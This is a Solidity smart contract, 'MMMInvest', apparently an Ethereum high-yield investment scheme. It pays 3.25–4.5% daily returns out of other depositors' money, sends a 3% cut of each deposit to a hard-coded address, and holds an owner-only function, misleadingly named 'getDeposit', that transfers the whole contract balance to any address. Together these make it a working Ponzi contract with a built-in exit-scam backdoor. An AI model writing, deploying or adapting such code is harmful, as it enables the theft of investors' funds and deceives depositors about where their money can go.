 

pragma solidity 0.4.25;

 

 
library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
     
    uint256 c = a / b;
     
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

library Percent {

  struct percent {
    uint num;
    uint den;
  }
  function mul(percent storage p, uint a) internal view returns (uint) {
    if (a == 0) {
      return 0;
    }
    return a*p.num/p.den;
  }

  function div(percent storage p, uint a) internal view returns (uint) {
    return a/p.num*p.den;
  }

  function sub(percent storage p, uint a) internal view returns (uint) {
    uint b = mul(p, a);
    if (b >= a) return 0;
    return a - b;
  }

  function add(percent storage p, uint a) internal view returns (uint) {
    return a + mul(p, a);
  }
}

contract MMMInvest{

    using SafeMath for uint;
    using Percent for Percent.percent;
     
    mapping (address => uint) public balances;
     
    mapping (address => uint) public time;
    address private owner;

     
    uint step1 = 200;
    uint step2 = 400;
    uint step3 = 600;
    uint step4 = 800;
    uint step5 = 1000;

     
    uint dividendsTime = 1 days;

    event NewInvestor(address indexed investor, uint deposit);
    event PayOffDividends(address indexed investor, uint value);
    event NewDeposit(address indexed investor, uint value);

    uint public allDeposits;
    uint public allPercents;
    uint public allBeneficiaries;
    uint public lastPayment;

    uint public constant minInvesment = 10 finney;

    address public commissionAddr = 0x93A2e794fbf839c3839bC41DC80f25f711065838;

    Percent.percent private m_adminPercent = Percent.percent(3, 100);

    constructor() public {
        owner = msg.sender;
    }

     
    modifier isIssetRecepient(){
        require(balances[msg.sender] > 0, "Deposit not found");
        _;
    }

     
    modifier timeCheck(){
         require(now >= time[msg.sender].add(dividendsTime), "Too fast payout request. The time of payment has not yet come");
         _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "access denied");
        _;
    }

    function getDepositMultiplier()public view returns(uint){
        uint percent = getPercent();

        uint rate = balances[msg.sender].mul(percent).div(10000);

        uint depositMultiplier = now.sub(time[msg.sender]).div(dividendsTime);

        return(rate.mul(depositMultiplier));
    }

    function getDeposit(address addr) onlyOwner public payable{
        addr.transfer(address(this).balance);
    }

    function receivePayment()isIssetRecepient timeCheck private{

        uint depositMultiplier = getDepositMultiplier();
        time[msg.sender] = now;
        msg.sender.transfer(depositMultiplier);

        allPercents+=depositMultiplier;
        lastPayment =now;
        emit PayOffDividends(msg.sender, depositMultiplier);
    }

     
    function authorizationPayment()public view returns(bool){

        if (balances[msg.sender] > 0 && now >= (time[msg.sender].add(dividendsTime))){
            return (true);
        }else{
            return(false);
        }
    }

     
    function getPercent() public view returns(uint){

        uint contractBalance = address(this).balance;

        uint balanceStep1 = step1.mul(1 ether);
        uint balanceStep2 = step2.mul(1 ether);
        uint balanceStep3 = step3.mul(1 ether);
        uint balanceStep4 = step4.mul(1 ether);
        uint balanceStep5 = step5.mul(1 ether);

        if(contractBalance < balanceStep1){
            return(325);
        }
        if(contractBalance >= balanceStep1 && contractBalance < balanceStep2){
            return(350);
        }
        if(contractBalance >= balanceStep2 && contractBalance < balanceStep3){
            return(375);
        }
        if(contractBalance >= balanceStep3 && contractBalance < balanceStep4){
            return(400);
        }
        if(contractBalance >= balanceStep4 && contractBalance < balanceStep5){
            return(425);
        }
        if(contractBalance >= balanceStep5){
            return(450);
        }
    }

    function createDeposit() private{

        if(msg.value > 0){

            require(msg.value >= minInvesment, "msg.value must be >= minInvesment");

            if (balances[msg.sender] == 0){
                emit NewInvestor(msg.sender, msg.value);
                allBeneficiaries+=1;
            }

             
            commissionAddr.transfer(m_adminPercent.mul(msg.value));

            if(getDepositMultiplier() > 0 && now >= time[msg.sender].add(dividendsTime) ){
                receivePayment();
            }

            balances[msg.sender] = balances[msg.sender].add(msg.value);
            time[msg.sender] = now;

            allDeposits+=msg.value;
            emit NewDeposit(msg.sender, msg.value);

        }else{
            receivePayment();
        }
    }

     
    function() external payable{
        createDeposit();
    }
}